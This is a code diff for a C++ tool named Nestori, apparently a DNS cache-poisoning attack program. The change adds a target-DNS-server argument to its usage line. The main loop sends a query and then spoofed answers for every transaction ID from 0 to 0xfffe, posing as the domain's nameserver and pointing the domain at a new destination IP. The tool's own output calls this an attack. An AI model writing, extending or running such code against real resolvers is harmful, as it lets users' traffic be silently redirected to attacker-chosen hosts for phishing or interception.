@@ -1,8 +1,8 @@
 #include "nestori.h"
 
 int main(int argc, char* argv[]) {
-	if (argc != 5) {
-		cout << "Usage:" << endl << "Nestori [target domain] [domain's NS] [IP of domain's NS] [new destination]" << endl;
+	if (argc != 6) {
+		cout << "Usage:" << endl << "Nestori [target DNS server] [target domain] [domain's NS] [IP of domain's NS] [new destination]" << endl;
 		return 1;
 	}
 
@@ -30,20 +30,22 @@ int main(int argc, char* argv[]) {
 		return 0;
 	}
 	
+	uint8_t dns[4];
 	uint8_t ns[4];
 	uint8_t ndest[4];
-	strToIp(argv[3], ns);
-	strToIp(argv[4], ndest);
+	strToIp(argv[1], dns);
+	strToIp(argv[4], ns);
+	strToIp(argv[5], ndest);
 	
 	srand(GetTickCount64());
 	cout << endl << "This attack will take anywhere from between 10 - 30 seconds, depending on how fast your internet connection is." << endl;
-
+	
 	for (uint16_t tid = 0; tid <= 0xfffe; tid++) {
-		if (!send_question(handle, convertDomain(argv[1]), (uint8_t*)(BYTE*)gateway)) {
+		if (!send_question(handle, dns, convertDomain(argv[2]), (uint8_t*)(BYTE*)gateway)) {
 			cout << endl << "Failed to send packet. Are you sure you've chosen the correct interface?" << endl;
 			return 0;
 		}
-		if (!send_answer(handle, convertDomain(argv[1]), convertDomain(argv[2]), ns, ndest, (uint8_t*)(BYTE*)gateway, tid)) {
+		if (!send_answer(handle, dns, convertDomain(argv[2]), convertDomain(argv[3]), ns, ndest, (uint8_t*)(BYTE*)gateway, tid)) {
 			cout << endl << "Failed to send packet. Are you sure you've chosen the correct interface?" << endl;
 			return 0;
 		}
